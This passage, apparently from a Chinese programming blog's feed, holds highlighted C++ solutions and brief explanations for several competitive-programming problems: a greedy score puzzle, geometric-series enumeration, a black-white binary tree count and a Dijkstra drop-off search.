k;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> totalSum, huaNum, cnt, deleteNum;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt; y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), cmp);</span><br><span class="line">    <span class="comment">// cout &lt;&lt; a.capacity() &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">// 取k个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        huaNum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    deleteNum = huaNum;</span><br><span class="line">    <span class="comment">// 已经直接大于小华的分数</span></span><br><span class="line">    <span class="keyword">if</span> (totalSum &gt; <span class="number">2</span> * huaNum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尝试删除大数</span></span><br><span class="line">    <span class="comment">// 必胜的话没有平局,也就是一定要大于</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 3 2 1</span></span><br><span class="line">        huaNum += a[i];</span><br><span class="line">        huaNum -= a[j++];</span><br><span class="line">        <span class="comment">// cout &lt;&lt; huaNum &lt;&lt; &#x27; &#x27;;</span></span><br><span class="line"></span><br><span class="line">        deleteNum += a[i];</span><br><span class="line">        <span class="comment">// if(totalSum - deleteNum)</span></span><br><span class="line">        <span class="keyword">if</span> (totalSum - deleteNum &gt; huaNum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// return i + 1 - k;</span></span><br><span class="line">            <span class="keyword">return</span> j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">        totalSum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">solve</span>(a);</span><br><span class="line">    <span class="comment">// for (int i : a)</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, i);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>2:</strong></p><p>为了求解这个问题，我们可以通过遍历所有可能的值来找到满足条件的 <code>(a, p, k)</code> 组合。这个过程需要考虑到等比数列的和的公式，并逐步检查每种可能的情况。</p><p>等比数列和的公式： 𝑆=𝑎𝑝𝑘−1𝑝−1<em>S</em>=<em>a**p</em>−1<em>p**k</em>−1</p><p>其中：</p><ul><li>𝑆<em>S</em> 是等比数列的和。</li><li>𝑎<em>a</em> 是首项。</li><li>𝑝<em>p</em> 是公比。</li><li>𝑘<em>k</em> 是项数。</li></ul><p>我们需要确保公式中的所有变量都满足整数条件，并且计算出的和等于给定的 𝑆<em>S</em>。</p><p>下面是一个 C++ 程序来实现这个要求：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">cpp复制代码<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;tuple&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">findGeometricSeries</span>(<span class="type">int</span> S) &#123;</span><br><span class="line">    vector&lt;tuple&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;&gt; solutions;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">2</span>; ; ++k) &#123;</span><br><span class="line">        <span class="type">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">2</span>; ; ++p) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> pk_minus_1 = <span class="built_in">pow</span>(p, k) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (pk_minus_1 &gt; S * (p - <span class="number">1</span>)) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (S * (p - <span class="number">1</span>) % pk_minus_1 == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> a = S * (p - <span class="number">1</span>) / pk_minus_1;</span><br><span class="line">                solutions.<span class="built_in">emplace_back</span>(a, p, k);</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(solutions.<span class="built_in">begin</span>(), solutions.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> solutions;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> S;</span><br><span class="line">    cin &gt;&gt; S;</span><br><span class="line"></span><br><span class="line">    vector&lt;tuple&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;&gt; solutions = <span class="built_in">findGeometricSeries</span>(S);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Case &quot;</span> &lt;&lt; solutions.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; [a, p, k] : solutions) &#123;</span><br><span class="line">        cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; k &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序解释">程序解释</h3><ol><li><p><strong>输入</strong>：程序从标准输入读取一个整数 𝑆<em>S</em>，即等比数列的和。</p></li><li><p>查找解</p><p>：</p><ul><li>使用嵌套循环遍历所有可能的 𝑘<em>k</em> 和 𝑝<em>p</em>。</li><li>对于每个 𝑘<em>k</em>，从 𝑝=2<em>p</em>=2 开始，计算 𝑝𝑘−1<em>p**k</em>−1。</li><li>如果 𝑝𝑘−1<em>p**k</em>−1 超过了 𝑆×(𝑝−1)<em>S</em>×(<em>p</em>−1)，则停止增加 𝑝<em>p</em>。</li><li>检查 𝑆×(𝑝−1)<em>S</em>×(<em>p</em>−1) 是否能被 𝑝𝑘−1<em>p**k</em>−1 整除，如果可以，则 𝑎=𝑆×(𝑝−1)𝑝𝑘−1<em>a</em>=<em>p**k</em>−1<em>S</em>×(<em>p</em>−1)，并且 𝑎,𝑝,𝑘<em>a</em>,<em>p</em>,<em>k</em> 组成一个有效解。</li><li>将找到的解存入 <code>solutions</code> 容器中。</li></ul></li><li><p>输出解</p><p>：</p><ul><li>对找到的解按照 𝑎,𝑝,𝑘<em>a</em>,<em>p</em>,<em>k</em> 进行排序。</li><li>打印解的数量和每个解。</li></ul></li></ol><p>这个程序首先找到所有可能的解，然后按要求排序并输出结果。这样可以确保所有满足条件的解都被找出，并且按照字典序输出。</p><hr><ol start="4"><li></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">int</span> color; <span class="comment">// 0 for black, 1 for white</span></span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="type">int</span> val, <span class="type">int</span> col) : <span class="built_in">value</span>(val), <span class="built_in">color</span>(col), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode *<span class="title">insert</span><span class="params">(TreeNode *root, <span class="type">int</span> value, <span class="type">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">TreeNode</span>(value, color);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (value &lt; root-&gt;value)</span><br><span class="line">    &#123;</span><br><span class="line">        root-&gt;left = <span class="built_in">insert</span>(root-&gt;left, value, color);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        root-&gt;right = <span class="built_in">insert</span>(root-&gt;right, value, color);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">countColors</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> leftColors = <span class="built_in">countColors</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> rightColors = <span class="built_in">countColors</span>(root-&gt;right);</span><br><span class="line">    <span class="type">int</span> black = leftColors.first + rightColors.first + (root-&gt;color == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> white = leftColors.second + rightColors.second + (root-&gt;color == <span class="number">1</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123;black, white&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt; <span class="title">isBlackWhiteTree</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="literal">true</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> colors = <span class="built_in">countColors</span>(root);</span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">abs</span>(colors.first - colors.second) &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="literal">false</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> leftCheck = <span class="built_in">isBlackWhiteTree</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> rightCheck = <span class="built_in">isBlackWhiteTree</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">if</span> (leftCheck.first &amp;&amp; rightCheck.first)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="literal">true</span>, leftCheck.second + rightCheck.second + <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="literal">false</span>, <span class="number">0</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">largestBlackWhiteTree</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> check = <span class="built_in">isBlackWhiteTree</span>(root);</span><br><span class="line">    <span class="keyword">if</span> (check.first)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> check.second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">max</span>(<span class="built_in">largestBlackWhiteTree</span>(root-&gt;left), <span class="built_in">largestBlackWhiteTree</span>(root-&gt;right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">processCase</span><span class="params">(<span class="type">int</span> n, <span class="type">const</span> std::vector&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; &amp;nodes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TreeNode *root = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;node : nodes)</span><br><span class="line">    &#123;</span><br><span class="line">        root = <span class="built_in">insert</span>(root, node.first, node.second);</span><br><span class="line">        <span class="type">int</span> maxSize = <span class="built_in">largestBlackWhiteTree</span>(root);</span><br><span class="line">        std::cout &lt;&lt; maxSize &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> T;</span><br><span class="line">    std::cin &gt;&gt; T;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">1</span>; t &lt;= T; ++t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        std::cin &gt;&gt; n;</span><br><span class="line">        std::vector&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">nodes</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            std::cin &gt;&gt; nodes[i].first &gt;&gt; nodes[i].second;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;case#&quot;</span> &lt;&lt; t &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">processCase</span>(n, nodes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><ol start="5"><li></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> to, weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dijkstra</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;Edge&gt;&gt; &amp;graph, <span class="type">int</span> start)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">distances</span><span class="params">(n + <span class="number">1</span>, INF)</span></span>;</span><br><span class="line">    distances[start] = <span class="number">0</span>;</span><br><span class="line">    priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">    pq.<span class="built_in">push</span>(&#123;<span class="number">0</span>, start&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> current_distance = pq.<span class="built_in">top</span>().first;</span><br><span class="line">        <span class="type">int</span> current_node = pq.<span class="built_in">top</span>().second;</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (current_distance &gt; distances[current_node])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;edge : graph[current_node])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> neighbor = edge.to;</span><br><span class="line">            <span class="type">int</span> weight = edge.weight;</span><br><span class="line">            <span class="type">int</span> distance = current_distance + weight;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (distance &lt; distances[neighbor])</span><br><span class="line">            &#123;</span><br><span class="line">                distances[neighbor] = distance;</span><br><span class="line">                pq.<span class="built_in">push</span>(&#123;distance, neighbor&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> distances;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find_best_drop_off</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> a, <span class="type">int</span> b, vector&lt;vector&lt;Edge&gt;&gt; &amp;graph)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; distances_from_1 = <span class="built_in">dijkstra</span>(n, graph, <span class="number">1</span>);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; distances_from_a = <span class="built_in">dijkstra</span>(n, graph, a);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; distances_from_b = <span class="built_in">dijkstra</span>(n, graph, b);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> min_distance = INF;</span><br><span class="line">    vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; results;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (distances_from_1[i] + distances_from_a[i] == distances_from_1[a])</span><br><span class="line">        &#123; <span class="comment">// Valid drop-off point</span></span><br><span class="line">            <span class="keyword">if</span> (distances_from_b[i] &lt; min_distance)</span><br><span class="line">            &#123;</span><br><span class="line">                min_distance = distances_from_b[i];</span><br><span class="line">                results = &#123;&#123;i, distances_from_1[i]&#125;&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (distances_from_b[i] == min_distance)</span><br><span class="line">            &#123;</span><br><span class="line">                results.<span class="built_in">push_back</span>(&#123;i, distances_from_1[i]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(results.<span class="built_in">begin</span>(), results.<span class="built_in">end</span>(), [](<span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;a, <span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;b)</span><br><span class="line">         &#123; <span class="keyword">return</span> a.second != b.second ? a.second &lt; b.second : a.first &lt; b.first; &#125;);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; min_distance &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;result : results)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; result.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; result.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, a, b;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; a &gt;&gt; b;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;Edge&gt;&gt; <span class="built_in">graph</span>(n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u, v, w;</span><br><span class="line">        cin &gt;&gt; u &gt;&gt; v &gt;&gt; w;</span><br><span class="line">        graph[u].<span class="built_in">push_back</span>(&#123;v, w&#125;);</span><br><span class="line">        graph[v].<span class="built_in">push_back</span>(&#123;u, w&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">find_best_drop_off</span>(n, m, a, b, graph);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计网物理层复习</title>
      <link href="/posts/df5cbf25.html"/>
      <url>/posts/df5cbf25.html</url>
      
